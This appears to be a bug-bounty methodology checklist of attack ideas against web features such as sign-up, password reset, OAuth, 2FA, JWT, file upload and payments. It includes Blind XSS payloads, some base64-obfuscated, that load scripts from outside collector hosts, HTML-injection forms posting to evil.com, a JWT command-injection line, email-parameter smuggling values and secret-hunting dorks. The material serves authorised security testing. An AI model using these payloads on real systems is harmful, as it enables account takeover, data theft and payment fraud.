# Hunting Methodology

> _**Recon**_

* [ ] Automation -> [Recon88r-Tool](https://github.com/h0tak88r/Recon88r)
* [ ] Play With Nuclei -> https://blog.projectdiscovery.io/ultimate-nuclei-guide/
* [ ] Play with FFUF `ffuf -u https://google.com/FUZZ -w Onelistforall/onelistforallshort.txt -mc 200,403` -> [onelistforall](https://github.com/six2dez/OneListForAll) -> [Seclists](https://github.com/danielmiessler/SecLists) -> [Assetnote](https://www.assetnote.io/)
* [ ] Do some \[\[Dorking]] Specially Shodan Dorking -> [Dorking](https://github.com/h0tak88r/Web-App-Security/blob/main/Dorking.md)
  * [ ] GitHub Dorking [gitdork-Helper](https://vsec7.github.io/) `pass | pwd | secret | key | private | credential | dbpassword | token`
  *   [ ] Google \[\[Dorking]]

      ```python
      # Google
      ext:php | ext:asp | ext:aspx | ext:jsp | ext:asp | ext:pl | ext:cfm | ext:py | ext:rb
      ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt |ext:ora | ext:ini | ext:yaml | ext:yml | ext:rdp | ext:ora | ext:bak | ext:log | ext:confi
      (ext:doc | ext:pdf | ext:xls | ext:txt | ext:ps | ext:rtf | ext:odt | ext:sxw | ext:psw | ext:ppt | ext:pps | ext:xml) intext:confidential salary 
      ```
  * [ ] Shodan Dorking `ssl.cert.subject.CN:"<specific_hos_name_>"`
* [ ] Check for API Docs
  * Swagger -> `/openapi.json`
  * GraphQL -> https://graphql.org/learn/introspection/ -> https://github.com/prisma-labs/get-graphql-schema
  * manual -> `site:target.tld intitle:api | developer`
* [ ] Look for API secrets
  * `site:target.tld inurl:api`
  * `intitle:"index of" "api.yaml" site:target.tld`
  * `intitle:"index of" intext:"apikey.txt" site:target.tld`
  * `allintext:"API_SECRET*" ext:env | ext:yml site:target.tld`

> _**Low Hanging Fruits**_

* [ ] [DNS-ZONE-TRANSFER-CHECKER](https://pentest-tools.com/network-vulnerability-scanning/dns-zone-transfer-check) -> P4
* [ ] SPF/DMARC Bugs using [mxtoolbox](https://mxtoolbox.com/dmarc.aspx) -> P3 -> DMARC only [DMARC Inspector](https://dmarcian.com/dmarc-inspector/) -> P4
* [ ] Check for any confirmations when deleting password
* [ ] **No Rate Limiting on Form** ( Registration, login, Email Triggering, SMS-Triggering )
* [ ] Missing Secure or HTTPOnly Cookie Flag > Session Token
* [ ] Lack of Security Headers -> Cache-Control for a Sensitive Page
* [ ] CAPTCHA Implementation Vulnerability -> \[\[CAPTCHA Feature]]
* [ ] Web Application Firewall (WAF) Bypass -> Direct Server Access Original IP
* [ ] Broken Link Hijacking via this [Extension](https://addons.mozilla.org/en-US/firefox/addon/find-broken-links/)
* [ ] HTML Injection ( Email Triggering , forms, meta tags .... )
* [ ] Failure to Invalidate Session > On Logout (Client and Server-Side)
  * In order for this to qualify for the client and server-side variant, you'd need to demonstrate that the session identifiers are not removed from the browser at the time of log out
* [ ] No Password Policy -> Password:`123`

> _**\[\[Registration]] Abuse**_

* [ ] Username/Email Enumeration > Non-Brute Force
* [ ] SQL Injection
* [ ] Signup and don't confirm the your email -> change email to others emails like `suppor@bugcrowd.com` -> confirm old email -> _**Email Verification Bypass**_
* [ ] Email Verification link Doesn't Expire After Email Change
* [ ] Verification link **leaked in the response**
* [ ] Verification Bypass via **Response Manipulation**
* [ ] [**Ability to bypass partner email confirmation to take over any store given an employee email**](https://hackerone.com/reports/300305)
* [ ] Signup and don't confirm the your email `emailA@gmail.com` -> change email to others emails like `emaiB@gmail.com` -> confirm new email -> Re-change email to your old Email -> _**Email Verification Bypass**_
*   [ ] \*ATO or **Duplicate Registration** by **manipulating email parameter (BAC)**

    ```python
    H0tak88r@bugcrowdninja.com
    MAybeeEE@GmaiL.coM
    h0tak88r+1@bugcrowdninja.com
    h0tak88r@bugcrowdninja.com a
    h0tak88r%00@bugcrowdninja.com
    h0tak88r%09@bugcrowdninja.com
    h0tak88r%20@bugcrowdninja.com
    victim@gmail.com@attacker.com
    victim@gmail.com@attacker.com
    victim@mail.com%0A%0Dcc:hacker@mail.com
    victim@mail.com%0A%0Dbcc:hacker@mail.com
    {"email":["victim@mail.com","hacker@mail.com"]}
    victim@mail.com&email=hacker@mail.com
    victim@mail.com,hacker@mail.com
    victim@mail.com%20hacker@mail.com
    victim@mail.com|hacker@mail.com
    victim@mail.com&Email=attacker@mail.com
    email@email.com,victim@hack.secry
    email@email“,”victim@hack.secry
    email@email.com:victim@hack.secry
    email@email.com%0d%0avictim@hack.secry
    %0d%0avictim@hack.secry
    %0avictim@hack.secry
    victim@hack.secry%0d%0a
    victim@hack.secry%0a
    victim@hack.secry%0d
    victim@hack.secr%00
    victim@hack.secry{{}}
    victim@gmail.com\n
    ```
* [ ] Make 2 Accounts Same in everything \[username and another things] but with Different email ID >> **ATO**
* [ ] [Duplicate Registration - The Twinning Twins | by Jerry Shah (Jerry) | Medium](https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf)
* [ ] Create user named: **AdMIn** (uppercase & lowercase letters)
* [ ] Create a user named: **admin=**
* [ ] **SQL Truncation Attack** (when there is some kind of **length limit** in the username or email) --> Create user with name: **admin \[a lot of spaces] a**
* [ ] _**OTP BYPASS**_
  * Response Manipulation
  * By repeating the form submission multiple times using repeater
  * Brute Forcing
  * \[\[JSON Tests Cheat Sheet]] -> Array of codes.....
  * Check for default OTP - 111111, 123456, 000000,4242
  * leaked in response
  * old OTP is still valid
  * Integrity Issues -> use someones else OTP to open your account
* [ ] **PATH Overwrite**
* [ ] **\[\[XSS\_HTML Injection|XSS\_HTML Injection]] in username/email for registration**

> _**\[\[CAPTCHA Feature]] Abuse**_

* [ ] [**Captcha Bypass via response manipulation**](https://bugcrowd.com/disclosures/55b40919-2c02-402c-a2cc-7184349926d7/login-capctha-bypass)
* [ ] **Do not send the parameter** related to the captcha.
  * Change from POST to GET or other HTTP Verbs
  * Change to JSON or from JSON
* [ ] Send the **captcha parameter empty**.
* [ ] Check if the value of the captcha is **in the source code** of the page.
* [ ] Check if the value is **inside a cookie.**
* [ ] Try to use an **old captcha value**
* [ ] Check if you can use the same captcha **value** several times with **the same or different session-ID.**
* [ ] If the captcha consists on a **mathematical operation** try to **automate** the **calculation.**
* [ ] Enter CAPTCHA as a Boolean value (`True`)

> _**\[\[Contact us Feature]]**_

* [ ] [**There is no rate limit for contact-us endpoints**](https://hackerone.com/reports/856305)
* [ ] [Blind XSS on image upload support chat](https://hackerone.com/reports/1010466)
*   [ ] Blind XSS

    ```html
    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL004U1pUOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
    '"><script src=//xss.report/s/M8SZT8></script>
    "><script src="https://js.rip/l5j9hbki0b"></script>
    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2w1ajloYmtpMGIiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
    ```
*   [ ] [**HTML Injection**](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)

    ```html
    https://evil.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1>hacker</h1><a Href='evil.com'>xxxx</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc
    "/><img src="x"><a href="https://evil.com">login</a>
    <button name=xss type=submit formaction='https://google.com'>I get consumed!
    <form action='http://evil.com/log_steal'>
    <form action=http://google.com><input type="submit">Click Me</input><select name=xss><option																<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
    ```

> _**\[\[Reset Password]] Abuse**_

* [ ] Failure to Invalidate Session -> On Password Reset and/or Change
* [ ] Password Reset Token Sent Over HTTP
* [ ] **0-CLICK** ATO by **manipulating email parameter (BAC)**
* [ ] **Response Manipulation** -> OTP Bypass -> **0-CLICK** ATO
* [ ] Request password reset -> Enter New Password -> Change Reference -> **IDOR** -> **0-CLICK** ATO
* [ ] \[\[Race Condition]] -> **0-CLICK** ATO
* [ ] [**Password reset token leaked via Referer header**](https://hackerone.com/reports/1320242)
* [ ] [**HTML\_Injection\_on\_password\_reset\_page**](https://github.com/KathanP19/HowToHunt/blob/master/HTML\_Injection/HTML\_Injection\_on\_password\_reset\_page.md)
* [ ] Token is Not Invalidated After Use
* [ ] Token is Not Invalidated After Email Change/Password Change
  * [Chaturbate | Report #411337 - Forget password link not expiring after email change. | HackerOne](https://hackerone.com/reports/411337)
* [ ] CRLF in URL `/resetPassword?0a%0dHost:atracker.tld` -> Host Header Injection
* [ ] [**IDN Homograph Attack leads to ATO**](https://infosecwriteups.com/how-i-was-able-to-change-victims-password-using-idn-homograph-attack-587111843aff)
* [ ] `victim.com@attacker.com` -> [0xacb.com/normalization\_table](https://0xacb.com/normalization\_table) -> Host Header Injection

> _**\[\[Profile - Settings]]**_

* [ ] [Missing rate limit in current password](https://hackerone.com/reports/1170522)
* [ ] \[\[JSON Tests Cheat Sheet]]
* [ ] \[\[CSRF]] when changing password/email
* [ ] [password change is confirmed when not matching](https://hackerone.com/reports/803028)
* [ ] Request password change -> Add email parameter and it's value the victim's email -> ATO
* [ ] \[\[IDOR]]
* [ ] [Abused 2FA to maintain persistence after a password change](https://medium.com/@lukeberner/how-i-abused-2fa-to-maintain-persistence-after-a-password-change-google-microsoft-instagram-7e3f455b71a1)
* [ ] `test.com/user/tester` —> Try Path Overwrite -> `test.com/user/login.php`
* [ ] Check for Stored-XSS
* [ ] Request change username -> add email parameter -> change email to victim email -> ATO
* [ ] [Insufficient Session Expiration - Previously issued email change tokens do not expire upon issuing a new email change token](https://hackerone.com/reports/1006677)
* [ ] request to change the email to `test@x.y` -> don't confirm and go register account -> then use email changing confirmation link
* [ ] Try \[\[XSS\_HTML Injection|XSS\_HTML Injection]] in email Section ->`"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com` -> `test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E`
* [ ] evil@a.com changes mail to 2@gmail.com (owned) -> gets email verification link -> sends link to victim, victim opens and victims account email is updated
* [ ] Change email Confirmation link not expired + OAUTH misconfiguration = ATO
  1. go to account settings and change mail address to [victim](mailto:victim@gmail.com)2[@gmail.com](mailto:victim111@gmail.com)
  2. a link will be sent to [victim](mailto:victim@gmail.com)2[@gmail.com](mailto:victim111@gmail.com), now the user realizes that he have lost access to [victim](mailto:victim@gmail.com)2[@gmail.com](mailto:victim111@gmail.com) due to some reasons
  3. so he will probably change mail to the another mail address for e.g [victim3@gmail.com](mailto:victim999@gmail.com) which he owns and has access to
  4. but it is found that even after verifying victim3@gmail.com, the old link which was sent to victim2@gmail.com is active, so user/attacker having access to that mail can verify it and Observe the OAuth misconfiguration that leads to account takeover
* [ ] Bypass Disallowed Change Phone Number Feature -> Repeat Requests `/SetPhoneNumber` and `/VerifyPhoneNumber` from burp history
* [ ] Check for any confirmations when deleting password
* [ ] [CSRF to delete accounts](https://hackerone.com/reports/1629828)
* [ ] \[\[IDOR|IDOR]] in Account Deletion Process
* [ ] Lack of Caching Protection for sensitive information/Responses
* [ ] Failure to Invalidate Session > On Logout (Client and Server-Side)
  * In order for this to qualify for the client and server-side variant, you'd need to demonstrate that the session identifiers are not removed from the browser at the time of log out
* [ ] Link Account with Gmail and copy the response -> Attacker request to link with victim gmail -> intercept the response and paste the response from step 1

> _**Testing \[\[Authorization-Schema]]**_

* [ ] Use account-A's Cookie/ Authorization-token to access account-B's Resources/Objects
* [ ] Use the **newsletter unsubscribe Session** to Access any Victim's PII
* [ ] **Non-confirmed email** session able to access any of resources that demands **Confirmed-Email** user
* [ ] Look for Leaky API Paths -> **Excessive Data Exposure**
* [ ] Testing different HTTP methods (GET, POST, PUT, DELETE, PATCH) will allow level escalation?
* [ ] Check for **Forbidden** Features for **low privilege** user and try to **use** this features
* [ ] Old or previous API versions are running unpatched
* [ ] Use param-miner tool OR [Arjun](https://github.com/s0md3v/Arjun) to guess parameters
* [ ] Do some Parameters-Values Tampers \[\[JSON Tests Cheat Sheet]]
* [ ] Not Completed 2FA able to access any authenticated endpoints
* [ ] follow a confirmation link for account `A` within the session of account `B` within an email confirmation flow -> it will link the verified email to account `B`

> _**\[\[Newsletter Feature]]**_

* [ ] \[\[IDOR]] via Changing the newsletter ID
* [ ] Logout from your account -> check old emails and click to `unsubscribe` button -> this will redirect newsletter subscription/un-subscription Page -> Check Burp History requests sometimes they leaks user details -> Excessive Data Exposure
* [ ] \[\[CSRF]] for unsubscribe option
* [ ] \[\[XSS\_HTML Injection]] `https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa`
* [ ] Unverified User Can Post Newsletter -> https://hackerone.com/reports/1691603
* [ ] BAC -> Fill the form with other's email -> https://hackerone.com/reports/145396
* [ ] No Rate Limit -> No-Captcha -> Spam Victim -> https://hackerone.com/reports/145612
* [ ] Host Header Injection -> https://hackerone.com/reports/229498

> _**\[\[OAUTH to ATO]]**_

* [ ] Test `edirect_uri` for \[\[Open Redirect]]
* [ ] [**XSS on OAuth authorize/authenticate endpoint**](https://hackerone.com/reports/87040) | \[\[XSS\_HTML Injection]]
* [ ] Test the existence of `response_type=token`
* [ ] Missing state parameter?
* [ ] Predictable state parameter?
* [ ] Is state parameter being verified?
* [ ] Change email -> \[\[IDOR]]
* [ ] Option to attach your social media profile to your existing account ? -> Forced OAuth profile linking
* [ ] Test for \[\[Web Cache Poisoning]]/Deception Issues
* [ ] \[\[SSRF]]
* [ ] OAUTH Code Flaws \[ Re-usability, Long time, brute force, code x for app y ]
* [ ] Access Token **Scope** Abuse
* [ ] Disclosure of Secrets -> `client_secret`
* [ ] Referrer Header leaking Code + State
* [ ] Access Token Stored in Browser History
* [ ] [Refresh token Abuse](https://medium.com/@iknowhatodo/what-about-refreshtoken-19914d3f2e46)
* [ ] [**Race Conditions in OAuth 2 API implementations**](https://hackerone.com/reports/55140)
* [ ] OAuth Misconfiguration -> Account Squatting | Pre-ATO

> _**\[\[2FA Feature]] Abuse**_

* [ ] Weak 2FA Implementation > 2FA Secret Cannot be Rotated\
  Rotating the secret means changing this key periodically to enhance security. If the 2FA secret cannot be rotated, it means that once the secret is compromised, an attacker could potentially gain ongoing access to the account without the user’s knowledge, as there is no way for the user to change the secret.
* [ ] Weak 2FA Implementation > 2FA Secret Remains Obtainable After 2FA is Enabled\
  Look for Leaked 2FA Secret after activating 2FA
* [ ] **Bypassing Verification** during 2FA setup via **Response Manipulation**
* [ ] Old session does not expire after **setup 2FA**
* [ ] Enable 2FA without verifying the email
* [ ] [IDOR](https://hackerone.com/reports/810880) -> 2FA setup for another user
* [ ] 2FA Code Leakage in Response
* [ ] Lack of Brute-Force Protection -> 2FA Bypass
* [ ] Missing 2FA Code Integrity Validation
* [ ] Bypass 2FA with null or 000000 or Blanc
* [ ] 2FA Referrer Check Bypass | Direct Request
* [ ] Complete the 2FA with your account but do not access the next part, Access it using the victim's Session who still into 2FA page -> 2FA Bypassed
* [ ] Changing the 2FA mode Leads to Bypass the code
* [ ] [Race Condition](https://hackerone.com/reports/1747978)
* [ ] Lack of Brute-Force Protection Disable 2FA
* [ ] Disable 2FA via CSRF
* [ ] Password Reset/Email Check → Disable 2FA -> 2FA Bypass
* [ ] Backup Code Abuse throw CORS Misconfiguration
* [ ] Password not checked when 2FA Disable
* [ ] Clickjacking on 2FA Disabling Page

> _**\[\[JWT Security Testing]]**_

* [ ] Edit the JWT with another User ID / Email
* [ ] Sensitive Data Exposure
* [ ] null signature `python3 jwt_tool.py JWT_HERE -X n`
* [ ] Multiple JWT test cases\
  `python3 jwt_tool.py -t https://api.example.com/api/working_endpoint -rh "Content-Type: application/json" -rh "Authorization: Bearer [JWT]" -M at`
* [ ] Test JWT secret brute-forcing `python3 jwt_tool.py <JWT> -C -d <Wordlist>`
* [ ] Abusing JWT Public Keys Without knowing the Public Key `https://github.com/silentsignal/rsa_sign2n`
* [ ] Test if algorithm could be changed
  * Change algorithm to None `python3 jwt_tool.py <JWT> -X a`
  * Change algorithm from RS256 to HS256 `python3 jwt_tool.py <JWT> -S hs256 -k public.pem`
  * algorithm confusion with no exposed key -> `docker run --rm -it portswigger/sig2n <token1> <token2>`
* [ ] Test if signature is being validated `python3 jwt_tool.py <JWT> -I -pc <Key> -pv <Value>`
* [ ] Test token expiration time (TTL, RTTL) -> change `exp:`
* [ ] Check for Injection in "kid" element `python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""`
* [ ] SQL injection in jwt header `admin' ORDER BY 1--`
* [ ] Command injection `kid: key.crt; whoami && python -m SimpleHTTPServer 1337 &`
* [ ] Check that keys and secrets are different between ENVs

> _**\[\[File Upload Feature]] Abuse**_

Reference:https://brutelogic.com.br/blog/file-upload-xss/

*   [ ] Quick Analysis

    ```python
    -----------------------------------------------------------------
    upload.random123		   ---	To test if random file extensions can be uploaded.
    upload.php			       ---	try to upload a simple php file.
    upload.php.jpeg 		   --- 	To bypass the blacklist.
    upload.jpg.php 		     ---	To bypass the blacklist. 
    upload.php 			       ---	and Then Change the content type of the file to image or jpeg.
    upload.php*			       ---	version - 1 2 3 4 5 6 7.
    upload.PHP			       ---	To bypass The BlackList.
    upload.PhP			       ---	To bypass The BlackList.
    upload.pHp			       ---	To bypass The BlackList.
    upload.htaccess 		   --- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
    pixelFlood.jpg			   ---	To test againt the DOS.
    frameflood.gif			   ---	upload gif file with 10^10 Frames
    Malicious zTXT  		   --- 	upload UBER.jpg 
    Upload zip file			   ---	test againts Zip slip (only when file upload supports zip file)
    Check Overwrite Issue	 --- 	Upload file.txt and file.txt with different content and check if 2nd file.txt overwrites 1st file
    SVG to XSS			       ---	Check if you can upload SVG files and can turn them to cause XSS on the target app
    SQLi Via File upload	 ---	Try uploading `sleep(10)-- -.jpg` as file
    ----------------------------------------------------------------------
    ```
* [ ] Test for IDOR By changing the object references \[filename, IDs,.....]
* [ ] EXIF Geo-location Data Not Stripped From Uploaded Images > Manual User Enumeration
* [ ] [xss\_comment\_exif\_metadata\_double\_quote](https://hackerone.com/reports/964550)
* [ ] XSS in filename `"><img src=x onerror=confirm(88)>.png`
* [ ] XSS metadata `exiftool -Artist=’ “><img src=1 onerror=alert(document.domain)>’ 88.jpeg`
* [ ] XSS in SVG `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`
* [ ] GIF to XSS `GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;`
* [ ] [**XSS in PDF**](https://drive.google.com/file/d/1JQ\_DVGdopanC59hnf6TF1dOwNsF\_wkFY/view)
* [ ] [ZIP TO XXE](https://hackerone.com/reports/105434)
* [ ] [SQL Injection - File name](https://shahjerry33.medium.com/sql-injection-the-file-upload-playground-6580b089d013)
* [ ] [XXE ON JPEG](https://hackerone.com/reports/836877)
* [ ] [Create A picture that steals Data](https://medium.com/@iframe\_h1/a-picture-that-steals-data-ff604ba101)

> \***\[\[Ban Feature]] Abuse**

* [ ] Try register account with the same name with you and block him
* [ ] [**Banned user still able to invited to reports as a collabrator and reset the password**](https://hackerone.com/reports/1959219)

> \***\[\[Commenting Feature]] Abuse**

* [ ] \[\[IDOR|IDOR]] Posting comments impersonating some other users.
* [ ] **DOM Clobbering**
* [ ] Markup Language? try [**Create A picture that steals Data**](https://medium.com/@iframe\_h1/a-picture-that-steals-data-ff604ba1012)
* [ ] \[\[IDOR|IDOR]] to Read any other's private comments
* [ ] Race Condition
* [ ] Privilege Escalation

> _**\[\[Chatting Features]]-\[\[Rich Editor Feature]]**_

* [ ] HTML Injection
* [ ] \[\[XSS\_HTML Injection]] in email id
* [ ] Blind XSS
*   [ ] XSS Bypass for Rich Text Editors

    ```python
    <</p>iframe src=javascript:alert()//
    <a href="aaa:bbb">x</a>
    <a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
    ```
* [ ] Hyperlink Injection `Click on me to claim 100$ vouchers](<https://evil.com>)`
* [ ] Markup Language? try [**Create A picture that steals Data**](https://medium.com/@iframe\_h1/a-picture-that-steals-data-ff604ba1012)
* [ ] flood the application using the session data of an old user > Improper Session Management
* [ ] \[\[IDOR]]

> _**\[\[Money Features]] Abuse**_

> Premium Feature Abuse | Paywall Bypass | Purchasing Feature Abuse

* [ ] Try **forcefully browsing** the areas or some particular endpoints which come under premium accounts
* [ ] **Pay for a premium feature** and cancel your subscription. If you get a **refund** but the feature is still **usable**, it’s a monetary impact issue.
* [ ] Some applications use **true-false request/response values** to validate if a user is having access to premium features or not.
* [ ] Try using **Burp’s Match & Replace to see if you** can replace these values whenever you browse the app & access the premium features.
* [ ] Always check **cookies or local storage** to see if any variable is checking if the user should have access to premium features or not.
* [ ] Buy Products at lower price • Add cheap items to the cart. During the payment process, capture the encrypted payment data being sent to the payment gateway. • Initiate another shopping process and add expensive/multiple items to the cart. Replace the payment data with the previously captured data. • If the application does not cross-validate the data, we’ll be able to buy products at a lower price
* [ ] **IDOR** in Change Price
  1. make a request to buy anything
  2. try changing the price in request/response
* [ ] **Currency Arbitrage**
  * Pay in 1 currency say USD and try to get a refund in EUR. Due to the diff in conversion rates, it might be possible to gain more amount.
  * change USD to any poor currency

> Refund Feature Abuse

* [ ] Purchase a product (usually some subscription) and ask for a refund to see if the feature is still accessible.
* [ ] Try for currency arbitrage
* [ ] Try making multiple requests for subscription cancellation (race conditions) to see if you can get multiple refunds.

> Cart/Wish list Abuse

* [ ] Add a product in **negative quantity** with other products in positive quantity to balance the amount.
* [ ] Add a product in more than the available quantity.
* [ ] Try to see when you add a product to your Wish-list and move it to a cart if it is possible to move it to some other user’s cart or delete it from there.

> Orders Page

* [ ] \[\[IDOR]]
* [ ] Leaking Credit Card Details in Responses -> Exclusive data disclosure
* [ ] If target support making accounts without confirming emails try to make order with victim account and then register account with the victim email if you found out previously made order's then it is a bug

> Transfer Money

* [ ] Bypass Transfer Money Limit with negative numbers
* [ ] Borrow Money Without Return by Change the loan return date to --> 31/February

> Gifts Feature

* [ ] [**Race Condition allows to redeem multiple times gift cards which leads to free "money"**](https://hackerone.com/reports/759247)
* [ ] [**Race conditions can be used to bypass invitation limit**](https://hackerone.com/reports/115007)

> Discount Checkout

* [ ] Apply the **same code** more than once to see if the coupon code is reusable.
* [ ] Input the gift code and intercept the request and remove it from the request
* [ ] Manipulate the response when reuse the discount code
* [ ] Discount is for multiple Items ? collect items and intercept the request change it to one item
* [ ] No Rate Limit --> https://hackerone.com/reports/123091
* [ ] Race Condition--> https://hackerone.com/reports/157996
* [ ] Try Mass Assignment or **HTTP Parameter Pollution** to see if you can add multiple coupon codes while the application only accepts one code from the Client Side.
* [ ] Try performing attacks that are caused by missing input sanitization such as **XSS, SQLi**, etc. on this field
* [ ] Try adding discount codes on the products which **are not covered under discounted** items by tampering with the request on the server-side.

> Delivery Charges Abuse

* [ ] Try tampering with the delivery charge rates to -ve values to see if the final amount can be reduced.
* [ ] Try checking for the free delivery by tampering with the params.

> _**\[\[Review Feature]]**_

* [ ] Some applications have an option where verified reviews are marked with some tick or it’s mentioned. Try to see if you can post a review as a **Verified Reviewer without purchasing that product**.
* [ ] Some app provides you with an option to provide a rating on a scale of 1 to 5, try to go beyond/below the scale-like **provide 0 or 6 or -ve**.
* [ ] Try to see if the same user can post multiple **ratings for a product**. This is an interesting endpoint to check for **Race Conditions**.
* [ ] Try to see if the file **upload field** is allowing any exts, it’s often observed that the devs miss out on implementing protections on such endpoints.
* [ ] Try to post reviews like some other users.
* [ ] Try **performing CSRF** on this functionality, often is not protected by tokens
* [ ] Get Better Yearly Rates by tampering parameters like `‘yearly_rate’: ‘3644’`
